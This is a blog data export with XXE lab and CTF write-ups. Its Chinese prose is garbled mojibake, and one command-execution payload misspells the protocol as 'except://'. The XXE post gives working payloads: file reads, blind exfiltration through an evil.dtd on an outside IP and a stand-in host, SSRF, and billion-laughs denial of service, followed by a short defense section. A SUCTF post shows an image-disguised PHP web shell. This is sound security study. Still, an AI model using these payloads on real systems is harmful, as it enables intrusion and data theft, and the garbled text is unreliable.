{"meta":{"title":"æ…¢å°±æ˜¯å¿« | glotozz'blog","subtitle":"è¿™ä¸ªäººæ¯”è¾ƒèœï¼Œä»€ä¹ˆè¯ä¹Ÿç•™ä¸ä¸‹","description":null,"author":"glotozz","url":"http://yoursite.com","root":"/"},"pages":[{"title":"æ„Ÿè°¢","date":"2019-07-18T11:37:42.000Z","updated":"2019-07-18T11:38:41.901Z","comments":true,"path":"tags/index.html","permalink":"http://yoursite.com/tags/index.html","excerpt":"","text":"è°¢è°¢æ”¯æŒæˆ‘çš„å°ä¼™ä¼´"}],"posts":[{"title":"Hacker101 Encrypted Pastebin","slug":"Hacker101-Encrypted-Pastebin","date":"2019-08-23T01:23:16.000Z","updated":"2019-08-23T01:55:19.505Z","comments":true,"path":"2019/08/23/Hacker101-Encrypted-Pastebin/","link":"","permalink":"http://yoursite.com/2019/08/23/Hacker101-Encrypted-Pastebin/","excerpt":"ä¹‹å‰åœ¨çœ‹å®‰å…¨å®¢çš„æ—¶å€™ç¿»åˆ°ä¸€ç¯‡Hacker101 CTFçš„æ–‡ç« ï¼Œæ®è¯´åœ¨è¿™ä¸ªå¹³å°åšé¢˜ä¼šæœ‰ç§äººæ¸—é€æµ‹è¯•é‚€è¯·ğŸ˜€ã€‚ä¸ªäººæ„Ÿè§‰è¿™é‡Œçš„é¢˜ç›®æ¯”è¾ƒåå®æˆ˜ï¼Œæ‰€ä»¥è¿˜æ˜¯ä¸é”™çš„ å…¶ä¸­æœ‰ä¸€é¢˜cbcå­—èŠ‚ç¿»è½¬æ”»å‡»ï¼Œè¿™é‡Œå°±è®°å½•ä¸‹ 1&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot; /&gt;","text":"ä¹‹å‰åœ¨çœ‹å®‰å…¨å®¢çš„æ—¶å€™ç¿»åˆ°ä¸€ç¯‡Hacker101 CTFçš„æ–‡ç« ï¼Œæ®è¯´åœ¨è¿™ä¸ªå¹³å°åšé¢˜ä¼šæœ‰ç§äººæ¸—é€æµ‹è¯•é‚€è¯·ğŸ˜€ã€‚ä¸ªäººæ„Ÿè§‰è¿™é‡Œçš„é¢˜ç›®æ¯”è¾ƒåå®æˆ˜ï¼Œæ‰€ä»¥è¿˜æ˜¯ä¸é”™çš„ å…¶ä¸­æœ‰ä¸€é¢˜cbcå­—èŠ‚ç¿»è½¬æ”»å‡»ï¼Œè¿™é‡Œå°±è®°å½•ä¸‹ 1&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot; /&gt; Encrypted Pastebin è¿™æ˜¯","categories":[],"tags":[{"name":"wp","slug":"wp","permalink":"http://yoursite.com/tags/wp/"},{"name":"cbcå­—èŠ‚ç¿»è½¬æ”»å‡»","slug":"cbcå­—èŠ‚ç¿»è½¬æ”»å‡»","permalink":"http://yoursite.com/tags/cbcå­—èŠ‚ç¿»è½¬æ”»å‡»/"}]},{"title":"xxeç¯å¢ƒæ­å»ºåŠå®æˆ˜","slug":"xxeç¯å¢ƒæ­å»ºåŠå®æˆ˜","date":"2019-08-21T23:11:51.000Z","updated":"2019-08-22T13:45:10.408Z","comments":true,"path":"2019/08/22/xxeç¯å¢ƒæ­å»ºåŠå®æˆ˜/","link":"","permalink":"http://yoursite.com/2019/08/22/xxeç¯å¢ƒæ­å»ºåŠå®æˆ˜/","excerpt":"è’Ÿè’»çš„æˆ‘ç»™å­¦å¼Ÿå­¦å¦¹åŸ¹è®­äº†ä¸¤å¤©ä»£ç å®¡è®¡ï¼Œæ„Ÿè§‰èº«ä½“è¿˜(è¢«)è¡Œ(æ)å§(ç©º) æ—©ä¸Šçœ‹åˆ°å¾®ä¿¡ä¸€ç¯‡æ–‡ç« xxeç¯å¢ƒæ­å»ºå³å®æˆ˜ï¼Œä¹‹å‰ä¹Ÿåšè¿‡ç±»ä¼¼çš„é¢˜ï¼ˆæ¯æ¬¡éƒ½æ˜¯ç½‘ä¸Šä¸´æ—¶æ‰¾çš„payloadï¼‰ï¼Œåæ­£æ²¡å•¥äº‹å„¿ï¼Œå°±è‡ªå·±æ­å»ºä¸‹ç¯å¢ƒã€‚ ä»¥åå°±ä¸ç”¨ä¸´æ—¶æ‰¾äº†ğŸ˜„","text":"è’Ÿè’»çš„æˆ‘ç»™å­¦å¼Ÿå­¦å¦¹åŸ¹è®­äº†ä¸¤å¤©ä»£ç å®¡è®¡ï¼Œæ„Ÿè§‰èº«ä½“è¿˜(è¢«)è¡Œ(æ)å§(ç©º) æ—©ä¸Šçœ‹åˆ°å¾®ä¿¡ä¸€ç¯‡æ–‡ç« xxeç¯å¢ƒæ­å»ºå³å®æˆ˜ï¼Œä¹‹å‰ä¹Ÿåšè¿‡ç±»ä¼¼çš„é¢˜ï¼ˆæ¯æ¬¡éƒ½æ˜¯ç½‘ä¸Šä¸´æ—¶æ‰¾çš„payloadï¼‰ï¼Œåæ­£æ²¡å•¥äº‹å„¿ï¼Œå°±è‡ªå·±æ­å»ºä¸‹ç¯å¢ƒã€‚ ä»¥åå°±ä¸ç”¨ä¸´æ—¶æ‰¾äº†ğŸ˜„ 1&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot; /&gt; xxe-labè¿™ä¸ªé¡¹ç›®ä½¿ç”¨å››ç§å½“ä¸‹æœ€å¸¸ç”¨è¯­è¨€çš„ç½‘ç«™ç¼–å†™è¯­è¨€æ¥ç¼–å†™çš„ä¸€ä¸ªå­˜åœ¨xxeæ¼æ´çš„web demoï¼Œç„¶åæˆ‘ç®€å•è§‚å¯Ÿäº†ä¸€ä¸‹ï¼Œé¦–å…ˆå‰ç«¯éƒ½æ˜¯é€šè¿‡ajaxå‘é€è¯·æ±‚ï¼Œå‘é€çš„æ•°æ®æ ¼å¼æ˜¯application/xml;charset=utf-8ï¼Œæ¥æ”¶åˆ°çš„æ•°æ®æ ¼å¼ä¹Ÿæ˜¯xml 12345678910111213141516171819202122232425262728293031323334&lt;script type=&apos;text/javascript&apos;&gt; function doLogin()&#123; var username = $(&quot;#username&quot;).val(); var password = $(&quot;#password&quot;).val(); if(username == &quot;&quot; || password == &quot;&quot;)&#123; alert(&quot;Please enter the username and password!&quot;); return; &#125; var data = &quot;&lt;user&gt;&lt;username&gt;&quot; + username + &quot;&lt;/username&gt;&lt;password&gt;&quot; + password + &quot;&lt;/password&gt;&lt;/user&gt;&quot;; $.ajax(&#123; type: &quot;POST&quot;, url: &quot;doLogin&quot;, contentType: &quot;application/xml;charset=utf-8&quot;, data: data, dataType: &quot;xml&quot;, anysc: false, success: function (result) &#123; var code = result.getElementsByTagName(&quot;code&quot;)[0].childNodes[0].nodeValue; var msg = result.getElementsByTagName(&quot;msg&quot;)[0].childNodes[0].nodeValue; if(code == &quot;0&quot;)&#123; $(&quot;.msg&quot;).text(msg + &quot; login fail!&quot;); &#125;else if(code == &quot;1&quot;)&#123; $(&quot;.msg&quot;).text(msg + &quot; login success!&quot;); &#125;else&#123; $(&quot;.msg&quot;).text(&quot;error:&quot; + msg); &#125; &#125;, error: function (XMLHttpRequest,textStatus,errorThrown) &#123; $(&quot;.msg&quot;).text(errorThrown + &apos;:&apos; + textStatus); &#125; &#125;); &#125;&lt;/script&gt; 1ã€è‡³äºæœåŠ¡ç«¯ï¼Œå…ˆåˆ†æä¸‹php123456789101112131415161718192021222324252627282930313233&lt;?php/*** autor: c0ny1* date: 2018-2-7*/$USERNAME = &apos;admin&apos;; //è´¦å·$PASSWORD = &apos;admin&apos;; //å¯†ç $result = null;libxml_disable_entity_loader(false);$xmlfile = file_get_contents(&apos;php://input&apos;);try&#123; $dom = new DOMDocument(); $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); $creds = simplexml_import_dom($dom); $username = $creds-&gt;username; $password = $creds-&gt;password; if($username == $USERNAME &amp;&amp; $password == $PASSWORD)&#123; $result = sprintf(&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;,1,$username); &#125;else&#123; $result = sprintf(&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;,0,$username); &#125; &#125;catch(Exception $e)&#123; $result = sprintf(&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;,3,$e-&gt;getMessage());&#125;header(&apos;Content-Type: text/html; charset=utf-8&apos;);echo $result;?&gt; æ­å»ºå®Œæˆä¹‹åå°è¯•æŠ“åŒ… æ˜æ˜¾çš„xmlæ ¼å¼ã€‚ ä¸‹é¢ç”¨ä¸¤ç§æ–¹æ³•å¤ç°ï¼ˆæœ‰æ— å›æ˜¾ï¼‰ 12345&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;!DOCTYPE ANY [ &lt;!ENTITY xxe &quot;Hacking&quot;&gt;]&gt;&lt;user&gt;&lt;username&gt;&amp;xxe;&lt;/username&gt;&lt;password&gt;123123&lt;/password&gt;&lt;/user&gt; å‘ç°xmlæˆåŠŸè¢«è§£æ æ„é€ ä»»æ„æ–‡ä»¶è¯»å–ï¼ˆbase64ç¼–ç è¯»å–phpæ–‡ä»¶ï¼‰ 12345&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;!DOCTYPE ANY [ &lt;!ENTITY xxe SYSTEM &quot;file:///c:/Windows/win.ini&quot;&gt;]&gt;&lt;user&gt;&lt;username&gt;&amp;xxe;&lt;/username&gt;&lt;password&gt;123123&lt;/password&gt;&lt;/user&gt; æ³¨æ„ç‚¹ï¼ŒSYSTEMä¸€å®šè¦å¤§å†™ windowä¸‹ä¹Ÿæ˜¯file:/// ç¨å¾®ä»‹ç»ä¸‹DTDå®ä½“å£°æ˜ 1ã€å†…éƒ¨å®ä½“å£°æ˜ï¼ˆé€šå¸¸å±å®³æå°ï¼‰1&lt;!ENTITY å®ä½“åç§° â€œå®ä½“çš„å€¼â€&gt; æ¯”å¦‚æˆ‘çš„ç¬¬ä¸€æ¬¡å°è¯• 12345&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;!DOCTYPE ANY [ &lt;!ENTITY xxe &quot;Hacking&quot;&gt;]&gt;&lt;user&gt;&lt;username&gt;&amp;xxe;&lt;/username&gt;&lt;password&gt;123123&lt;/password&gt;&lt;/user&gt; 2ã€å¤–éƒ¨å®ä½“å£°æ˜XMLä¸­å¯¹æ•°æ®çš„å¼•ç”¨ç§°ä¸ºå®ä½“ï¼Œå®ä½“ä¸­æœ‰ä¸€ç±»å«å¤–éƒ¨å®ä½“ï¼Œç”¨æ¥å¼•å…¥å¤–éƒ¨èµ„æºï¼Œæœ‰SYSTEMå’ŒPUBLICä¸¤ä¸ªå…³é”®å­—ï¼Œè¡¨ç¤ºå®ä½“æ¥è‡ªæœ¬åœ°è®¡ç®—æœºè¿˜æ˜¯å…¬å…±è®¡ç®—æœºï¼Œå¤–éƒ¨å®ä½“çš„å¼•ç”¨å¯ä»¥å€ŸåŠ©å„ç§åè®®ï¼Œæ¯”å¦‚å¦‚ä¸‹çš„ä¸‰ç§ï¼š 123file:///path/to/file.exthttp://urlphp://filter/read=convert.base64-encode/resource=conf.php 1&lt;!ENTITY å®ä½“åç§° SYSTEM â€œURI/URLâ€&gt; æ¯”å¦‚ç¬¬äºŒæ¬¡å°è¯• 12345&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;!DOCTYPE ANY [ &lt;!ENTITY xxe SYSTEM &quot;file:///c:/Windows/win.ini&quot;&gt;]&gt;&lt;user&gt;&lt;username&gt;&amp;xxe;&lt;/username&gt;&lt;password&gt;123123&lt;/password&gt;&lt;/user&gt; å¤–éƒ¨å¼•ç”¨å¯æ”¯æŒhttpï¼Œfileç­‰åè®®ï¼Œä¸åŒçš„è¯­è¨€æ”¯æŒçš„åè®®ä¸åŒï¼Œä½†å­˜åœ¨ä¸€äº›é€šç”¨çš„åè®®ï¼Œå…·ä½“å†…å®¹å¦‚ä¸‹æ‰€ç¤ºï¼š ========================================================================== 2ã€xxeæ£€æµ‹ ç”„åˆ«é‚£äº›æ¥å—XMLä½œä¸ºè¾“å…¥å†…å®¹çš„ç«¯ç‚¹ã€‚ ä½†æ˜¯æœ‰æ—¶å€™ï¼Œè¿™äº›ç«¯ç‚¹å¯èƒ½å¹¶ä¸æ˜¯é‚£ä¹ˆæ˜æ˜¾(æ¯”å¦‚ï¼Œä¸€äº›ä»…ä½¿ç”¨JSONå»è®¿é—®æœåŠ¡çš„å®¢æˆ·ç«¯)ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæ¸—é€æµ‹è¯•äººå‘˜å°±å¿…é¡»å°è¯•ä¸åŒçš„æµ‹è¯•æ–¹å¼ï¼Œæ¯”å¦‚ä¿®æ”¹HTTPçš„è¯·æ±‚æ–¹æ³•ï¼Œä¿®æ”¹Content-Typeå¤´éƒ¨å­—æ®µç­‰ç­‰æ–¹æ³•ï¼Œç„¶åçœ‹çœ‹åº”ç”¨ç¨‹åºçš„å“åº”ï¼Œçœ‹çœ‹ç¨‹åºæ˜¯å¦è§£æäº†å‘é€çš„å†…å®¹ï¼Œå¦‚æœè§£æäº†ï¼Œé‚£ä¹ˆåˆ™å¯èƒ½æœ‰XXEæ”»å‡»æ¼æ´ã€‚ xxeæ¼æ´æ£€æµ‹ï¼ˆé»‘ç›’ï¼‰å…ˆæ£€æµ‹XMLæ˜¯å¦ä¼šè¢«æˆåŠŸè§£æ 12345&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; &lt;!DOCTYPE ANY [ &lt;!ENTITY name &quot;my name is nMask&quot;&gt;]&gt;&lt;root&gt;&amp;name;&lt;/root&gt; å†æ£€æµ‹æ˜¯å¦æ”¯æŒDTDå¼•ç”¨å¤–éƒ¨å®ä½“ 12345&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;!DOCTYPE ANY [ &lt;!ENTITY % name SYSTEM &quot;http://59.110.164.44/index.html&quot;&gt; %name; ]&gt; åœ¨æœåŠ¡å™¨ä¸ŠæŸ¥çœ‹æ˜¯å¦å­˜åœ¨è®¿é—®è®°å½• xxeç™½ç›’å®¡è®¡ æœ€å¼€å§‹ï¼Œå¼•å…¥ä¸€ä¸ªfile_get_contentså‡½æ•°ï¼Œå°†æ•´ä¸ªXMLæ•°æ®è¯»å…¥dataå­—ç¬¦ä¸²ä¸­ï¼Œç„¶åäº¤ç»™phpçš„xmlè§£æå‡½æ•°simplexml_load_string()è§£æï¼Œè§£æåçš„æ•°æ®èµ‹ç»™xmlå˜é‡ã€‚ è¿™ä¸€æ•°æ®å³XMLå­—ç¬¦ä¸²ä¸­ä½¿ç”¨çš„å¯¹è±¡(æˆ–è€…è¯´æ ¹å…ƒç´ )çš„æ•°æ®ï¼Œå¹¶echoè¾“å‡ºå‡ºæ¥ã€‚ 12345&lt;?php $data = file_get_contents(&apos;php://input&apos;); //è·å–æäº¤çš„XMLæ•°æ® $xml = simplexml_load_string($data); // äº¤ç»™PHPçš„XMLè§£æå‡½æ•° echo $xml-&gt;name;?&gt; ========================================================================== 3ã€xxeæ”»å‡»æ–¹å¼ æœ‰å›æ˜¾çš„æƒ…å†µ é€šå¸¸ä»¥ä¸‹ä¸¤ç§ 123456789&lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY &gt;&lt;!ENTITY xxe SYSTEM &quot;file:///c:/windows/win.ini&quot; &gt;]&gt;&lt;foo&gt;&amp;xxe;&lt;/foo&gt; &lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY &gt;&lt;!ENTITY % xxe SYSTEM &quot;http://xxx.xxx.xxx/evil.dtd&quot; &gt;%xxe;]&gt;&lt;foo&gt;&amp;evil;&lt;/foo&gt; å¤–éƒ¨evil.dtdçš„å†…å®¹ 1&lt;!ENTITY evil SYSTEM &quot;file:///c:/windows/win.ini&quot; &gt; è¿˜å¯ä»¥å†…ç½‘ç«™ç‚¹çš„å…¥ä¾µ 123&lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY &gt;&lt;!ENTITY xxe SYSTEM &quot;http://192.168.6.100/news.php?newsid=-1+union+select+1,(user())&quot; &gt;]&gt;&lt;foo&gt;&amp;xxe;&lt;/foo&gt; æ— å›æ˜¾çš„æƒ…å†µ blind xxeæ¼æ´æ–¹æ¡ˆ1ï¼štest.php 123&lt;?php file_put_contents(&quot;test.txt&quot;, $_GET[&apos;file&apos;]) ; ?&gt; index.php 123456789101112131415&lt;?php $xml=&lt;&lt;&lt;EOF &lt;?xml version=&quot;1.0&quot;?&gt; &lt;!DOCTYPE ANY[ &lt;!ENTITY % file SYSTEM &quot;file:///C:/test.txt&quot;&gt; &lt;!ENTITY % remote SYSTEM &quot;http://localhost/test.xml&quot;&gt; %remote; %all; %send; ]&gt; EOF; $data = simplexml_load_string($xml) ; echo &quot;&lt;pre&gt;&quot; ; print_r($data) ; ?&gt; test.html 1&lt;!ENTITY % all &quot;&lt;!ENTITY % send SYSTEM &apos;http://localhost/test.php?file=%file;&apos;&gt;&quot;&gt; å½“è®¿é—®http://localhost/index.php, å­˜åœ¨æ¼æ´çš„æœåŠ¡å™¨ä¼šè¯»å‡ºtext.txtå†…å®¹ï¼Œå‘é€ç»™æ”»å‡»è€…æœåŠ¡å™¨ä¸Šçš„test.phpï¼Œç„¶åæŠŠè¯»å–çš„æ•°æ®ä¿å­˜åˆ°æœ¬åœ°çš„test.txtä¸­ã€‚ blind xxeæ¼æ´æ–¹æ¡ˆ2ï¼š1234&lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY &gt;&lt;!ENTITY % xxe SYSTEM &quot;http://59.110.164.44/evil.dtd&quot; &gt;%xxe;]&gt;&lt;foo&gt;&amp;b;&lt;/foo&gt; 1&lt;!ENTITY b SYSTEM &quot;file:///c:/windows/win.ini&quot;&gt; æˆ–è€… 12&lt;!DOCTYPE a SYSTEM &quot;http://59.110.164.44/evil.dtd&quot;&gt;&lt;user&gt;&lt;username&gt;&amp;b;&lt;/username&gt; dtdå†…å®¹ 1&lt;!ENTITY b SYSTEM &quot;file:///c:/windows/win.ini&quot;&gt; å‡ºç°æŠ¥é”™DOMDocument::loadXML(): Malformed declaration expecting version in Entity, line: 1 in éœ€è¦æŠŠ 12&gt; &lt;?xml verstion=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&gt; åˆ å» blind xxeæ¼æ´æ–¹æ¡ˆ3ï¼š å¯ä»¥ä½¿ç”¨å¤–å¸¦æ•°æ®é€šé“æå–æ•°æ®ï¼Œå…ˆä½¿ç”¨php://filterè·å–ç›®æ ‡æ–‡ä»¶çš„å†…å®¹ï¼Œç„¶åå°†å†…å®¹ä»¥httpè¯·æ±‚å‘é€åˆ°æ¥å—æ•°æ®çš„æœåŠ¡å™¨(æ”»å‡»æœåŠ¡å™¨)xxx.xxx.xxxã€‚ 1234567&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE ANY [&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=./target.php&quot;&gt; # /etc/issue&lt;!ENTITY % dtd SYSTEM &quot;http://xxx.xxx.xxx/evil.dtd&quot;&gt;%dtd;%send;]&gt; evil.dtdçš„å†…å®¹ï¼Œå†…éƒ¨çš„%å·è¦è¿›è¡Œå®ä½“ç¼–ç æˆ&amp;#x25 1234&lt;!ENTITY % all&quot;&lt;!ENTITY &amp;#x25; send SYSTEM &apos;http://xxx.xxx.xxx/?%file;&apos;&gt;&quot;&gt;%all; ========================================================================== è¿™é‡Œå¤ç°ä¸‹ç¬¬ä¸‰ç§ 1234567&lt;?xml version=&quot;1.0&quot;?&gt; &lt;!DOCTYPE ANY [ &lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///c:/windows/win.ini&quot;&gt; &lt;!ENTITY % dtd SYSTEM &quot;http://59.110.164.44/evil.dtd&quot;&gt; %dtd; %send;]&gt; åœ¨æœåŠ¡ä¸Šéƒ¨ç½²evil.dtdæ–‡ä»¶ 1234&lt;!ENTITY % all&quot;&lt;!ENTITY &amp;#x25; send SYSTEM &apos;http://59.110.164.44/?%file;&apos;&gt;&quot;&gt;%all; base64è§£ç å³å¯ ========================================================================== å…¶ä»–å±å®³1ã€å‘½ä»¤æ‰§è¡Œ phpç¯å¢ƒä¸‹ï¼Œxmlå‘½ä»¤æ‰§è¡Œè¦æ±‚phpè£…æœ‰expectæ‰©å±•ã€‚è€Œè¯¥æ‰©å±•é»˜è®¤æ²¡æœ‰å®‰è£…ã€‚ 123456789101112&gt; &lt;?php&gt; $xml = &lt;&lt;&lt;EOF&gt; &lt;?xml version = &quot;1.0&quot;?&gt;&gt; &lt;!DOCTYPE ANY [&gt; &lt;!ENTITY f SYSTEM &quot;except://ls&quot;&gt; # id&gt; ]&gt;&gt; &lt;x&gt;&amp;f;&lt;/x&gt;&gt; EOF;&gt; $data = simplexml_load_string($xml);&gt; print_r($data);&gt; ?&gt;&gt; 2ã€å†…ç½‘æ¢æµ‹/SSRF ç”±äºxmlå®ä½“æ³¨å…¥æ”»å‡»å¯ä»¥åˆ©ç”¨http://åè®®ï¼Œä¹Ÿå°±æ˜¯å¯ä»¥å‘èµ·httpè¯·æ±‚ã€‚å¯ä»¥åˆ©ç”¨è¯¥è¯·æ±‚å»æ¢æŸ¥å†…ç½‘ï¼Œè¿›è¡ŒSSRFæ”»å‡»ã€‚ 123456789101112&gt; &lt;?php&gt; $xml = &lt;&lt;&lt;EOF&gt; &lt;?xml version = &quot;1.0&quot;?&gt;&gt; &lt;!DOCTYPE ANY [&gt; &lt;!ENTITY f SYSTEM &quot;http://192.168.1.1:80/&quot;&gt;&gt; ]&gt;&gt; &lt;x&gt;&amp;f;&lt;/x&gt;&gt; EOF;&gt; $data = simplexml_load_string($xml);&gt; print_r($data);&gt; ?&gt;&gt; 3ã€æ‹’ç»æœåŠ¡æ”»å‡» 1234567891011121314&gt; &lt;?xml version=&quot;1.0&quot;?&gt;&gt; &lt;!DOCTYPE lolz [&gt; &lt;!ENTITY lol &quot;lol&quot;&gt;&gt; &lt;!ENTITY lol2 &quot;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&quot;&gt;&gt; &lt;!ENTITY lol3 &quot;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&quot;&gt;&gt; &lt;!ENTITY lol4 &quot;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&quot;&gt;&gt; &lt;!ENTITY lol5 &quot;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&quot;&gt;&gt; &lt;!ENTITY lol6 &quot;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&quot;&gt;&gt; &lt;!ENTITY lol7 &quot;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&quot;&gt;&gt; &lt;!ENTITY lol8 &quot;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&quot;&gt;&gt; &lt;!ENTITY lol9 &quot;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&quot;&gt;&gt; ]&gt;&gt; &lt;lolz&gt;&amp;lol9;&lt;/lolz&gt;&gt; ä¸Šé¢æ ·ä¾‹ä»£ç 2ä¸­çš„XXEæ¼æ´æ”»å‡»å°±æ˜¯è‘—åçš„â€™billion laughsâ€™ æ”»å‡»ã€‚ è¯¥æ”»å‡»é€šè¿‡åˆ›å»ºä¸€é¡¹é€’å½’çš„ XML å®šä¹‰ï¼Œåœ¨å†…å­˜ä¸­ç”Ÿæˆåäº¿ä¸ªâ€Ha!â€å­—ç¬¦ä¸²ï¼Œä»è€Œå¯¼è‡´ DDoS æ”»å‡»ã€‚ åŸç†ä¸ºï¼šæ„é€ æ¶æ„çš„XMLå®ä½“æ–‡ä»¶è€—å°½å¯ç”¨å†…å­˜ï¼Œå› ä¸ºè®¸å¤šXMLè§£æå™¨åœ¨è§£æXMLæ–‡æ¡£æ—¶å€¾å‘äºå°†å®ƒçš„æ•´ä¸ªç»“æ„ä¿ç•™åœ¨å†…å­˜ä¸­ï¼Œè§£æéå¸¸æ…¢ï¼Œé€ æˆäº†æ‹’ç»æœåŠ¡å™¨æ”»å‡»ã€‚é™¤äº†è¿™äº›ï¼Œæ”»å‡»è€…è¿˜å¯ä»¥è¯»å–æœåŠ¡å™¨ä¸Šçš„æ•æ„Ÿæ•°æ®ï¼Œè¿˜èƒ½é€šè¿‡ç«¯å£æ‰«æï¼Œè·å–åç«¯ç³»ç»Ÿçš„å¼€æ”¾ç«¯å£ã€‚ ========================================================================== é˜²å¾¡ç¦ç”¨å¤–éƒ¨å®ä½“ PHP libxml_disable_entity_loader(true); JAVA DocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance(); dbf.setExpandEntityReferences(false); Python from lxml import etree xmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False)) è¿‡æ»¤ç”¨æˆ·æäº¤çš„æ•°æ® è¿‡æ»¤å…³é”®è¯ï¼š&lt;!DOCTYPEå’Œ&lt;!ENTITYï¼Œæˆ–è€…SYSTEMå’ŒPUBLIC å‚è€ƒé“¾æ¥ï¼šhttps://www.cnblogs.com/zhaijiahui/p/9147595.html https://github.com/c0ny1/xxe-lab https://mp.weixin.qq.com/s/MnY6dd8YDxfCmssYzDurnA https://en.wikipedia.org/wiki/Billion_laughs","categories":[],"tags":[{"name":"æ¼æ´å¤ç°","slug":"æ¼æ´å¤ç°","permalink":"http://yoursite.com/tags/æ¼æ´å¤ç°/"},{"name":"xxe","slug":"xxe","permalink":"http://yoursite.com/tags/xxe/"}]},{"title":"suctf2019 web","slug":"suctf2019-web","date":"2019-08-17T01:09:09.000Z","updated":"2019-08-22T13:45:29.648Z","comments":true,"path":"2019/08/17/suctf2019-web/","link":"","permalink":"http://yoursite.com/2019/08/17/suctf2019-web/","excerpt":"è¿™ä¸¤å¤©å¤´æœ‰ç‚¹æ™•ï¼Œsuctféšä¾¿åšåš 1&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot; /&gt;","text":"è¿™ä¸¤å¤©å¤´æœ‰ç‚¹æ™•ï¼Œsuctféšä¾¿åšåš 1&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot; /&gt; web1æœ¬æ¥æ˜¯æ²¡å•¥æ€è·¯çš„ï¼Œä¸Šä¼ .htaccessæˆåŠŸä½†æ˜¯ä¸è¢«è§£æã€‚ã€‚ã€‚ã€‚ğŸ˜¥ ä¸Šä¼ phpæ–‡ä»¶çš„æ—¶å€™æç¤ºä¸èƒ½å­˜åœ¨&lt;?ï¼Œè¿™ä¸ªç”¨ä¸‹é¢çš„ç»•è¿‡å³å¯ï¼Œä½†æ˜¯è¦æ±‚phpå°äº7.0 1&lt;script language=php&gt;system(&quot;cat è®¿é—®çš„æ–‡ä»¶å.txt&quot;)&lt;/script&gt; çªç„¶å†œå¤§çš„ä¸€ä½å¤§ä½¬è¯´å¯ä»¥åˆ©ç”¨.user.ini å› ä¸ºå½“å‰æ–‡ä»¶å¤¹ä¸‹å­˜åœ¨index.phpï¼Œæ‰€ä»¥ä¸Šä¼ .user.ini. 12GIF89aauto_prepend_file=1.jpg ç»§ç»­ä¸Šä¼ 1.jpg 12GIF89a&lt;script language=&apos;php&apos;&gt;@eval($_GET[cmd])&lt;/script&gt; è®¿é—®è·¯å¾„ ä¿®æ”¹cmd=system(â€˜cat /flagâ€™);å³å¯ ========================================================================== web21234567891011121314151617181920212223242526272829303132333435363738&lt;?php function get_the_flag()&#123; // webadmin will remove your upload file every 20 min!!!! $userdir = &quot;upload/tmp_&quot;.md5($_SERVER[&apos;REMOTE_ADDR&apos;]); if(!file_exists($userdir))&#123; mkdir($userdir); &#125; if(!empty($_FILES[&quot;file&quot;]))&#123; $tmp_name = $_FILES[&quot;file&quot;][&quot;tmp_name&quot;]; $name = $_FILES[&quot;file&quot;][&quot;name&quot;]; $extension = substr($name, strrpos($name,&quot;.&quot;)+1); if(preg_match(&quot;/ph/i&quot;,$extension)) die(&quot;^_^&quot;); if(mb_strpos(file_get_contents($tmp_name), &apos;&lt;?&apos;)!==False) die(&quot;^_^&quot;); if(!exif_imagetype($tmp_name)) die(&quot;^_^&quot;); $path= $userdir.&quot;/&quot;.$name; @move_uploaded_file($tmp_name, $path); print_r($path); &#125; &#125; $hhh = @$_GET[&apos;_&apos;]; if (!$hhh)&#123; highlight_file(__FILE__); &#125; if(strlen($hhh)&gt;18)&#123; die(&apos;One inch long, one inch strong!&apos;); &#125; if ( preg_match(&apos;/[\\x00- 0-9A-Za-z\\&apos;&quot;\\`~_&amp;.,|=[\\x7F]+/i&apos;, $hhh) ) die(&apos;Try something else!&apos;); $character_type = count_chars($hhh, 3); if(strlen($character_type)&gt;12) die(&quot;Almost there!&quot;); eval($hhh);?&gt; 